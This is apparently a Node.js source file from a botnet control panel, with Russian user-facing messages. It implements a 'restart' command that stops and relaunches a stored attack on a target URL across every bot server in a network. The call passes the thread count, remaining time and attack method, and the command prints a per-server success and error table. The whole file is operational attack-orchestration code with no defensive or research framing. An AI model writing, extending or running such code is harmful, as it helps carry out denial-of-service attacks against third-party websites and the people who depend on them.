const CommandsCore = require('../../core')
const CommonData = require('../../../../common/data')
const center = require('../../../../utils/center')
const Botnet = require('../../../../botnet/core')
const { clearWithLogo } = require('../../../../utils/logo')
const Table = require('cli-table')
const sp = require('../../../../utils/sp')
const gradient = require('gradient-string')
const config = require('../../../../../config')

const green = gradient(['#36D917', '#36D917'])

CommandsCore.cmdInit(/^restart ([0-9]+)$/i, async (client, command, args) => {
    const attack = CommonData.attacks.find(x => x.id === Number(args[1]) && (x.network === client.user.network || client.user.network === config.GlobalNetworkName))
    if(!attack) {
        return client.write(center('Атака не найдена.'.red.italic, client.getWidth()) + '\n\n')
    }
    if(attack.sender !== client.username && !client.user.admin) {
        return client.write(center('Это не ваша атака.'.red.italic, client.getWidth()) + '\n\n')
    }

    let success = 0;
    let errors = 0;
    let internalErrors = 0;

    let success2 = 0;
    let errors2 = 0;
    let internalErrors2 = 0;

    const timeLeft = Math.round((attack.end - Date.now()) / 1000)

    for(const server of CommonData.servers[attack.network]) {
        const serverNum = Number(CommonData.servers[attack.network].indexOf(server))
        client.write(center(`Сервер №${serverNum + 1}`.brightBlue.bold, client.getWidth()) + '\n')
        let status = "OK".brightGreen
        const res = await Botnet.stop(attack.id, server);
        if(!res) {
            status = "ERROR".brightRed
            errors++;
        } else if(!res.success) {
            status = "INTERNAL ERROR".brightRed
            internalErrors++;
        } else success++;
        client.write(`Stopping Attack `.brightWhite.bold + '.'.gray.repeat(client.getWidth() / 2 - serverNum.toString().length) + " " + status + '\n')
        let status2 = "OK".brightGreen
        const res2 = await Botnet.start(attack.url, attack.threads, timeLeft, attack.method, attack.id, server);
        if(!res2) {
            status2 = "ERROR".brightRed
            errors2++;
        } else if(!res2.success) {
            status2 = "INTERNAL ERROR".brightRed
            internalErrors2++;
        } else success2++;
        client.write(`Starting Attack `.brightWhite.bold + '.'.gray.repeat(client.getWidth() / 2 - serverNum.toString().length) + " " + status2 + '\n')
    }

    let str = ''

    str += '\t  Атака перезапущена!  '.bgGreen.brightWhite.bold + '\n\n'
    + '\tID: '.brightBlue + attack.id.toString().brightWhite + '\n'
    + '\tURL: '.brightBlue + attack.url.brightWhite + '\n'
    + '\tMethod: '.brightBlue + attack.method.brightWhite + '\n'
    + '\tTime left: '.brightBlue + `${sp(timeLeft)} seconds`.brightWhite + '\n'
    + '\tThreads: '.brightBlue + attack.threads.toString().brightWhite + '\n\n'

    const table = new Table({
        head: ['', green('Success'), 'Errors'.brightRed, 'Int. Errors'.brightRed],
    });

    let stoppingKey = 'Stopping'.brightWhite
    let startingKey = 'Starting'.brightWhite

    const body = []

    const toPushStopping = {}
    toPushStopping[stoppingKey] = [success, errors, internalErrors]
    const toPushStarting = {}
    toPushStarting[startingKey] = [success2, errors2, internalErrors2]

    table.push(toPushStopping, toPushStarting)

    client.write(clearWithLogo(client))
    client.write(str + table.toString() + '\n\n')
})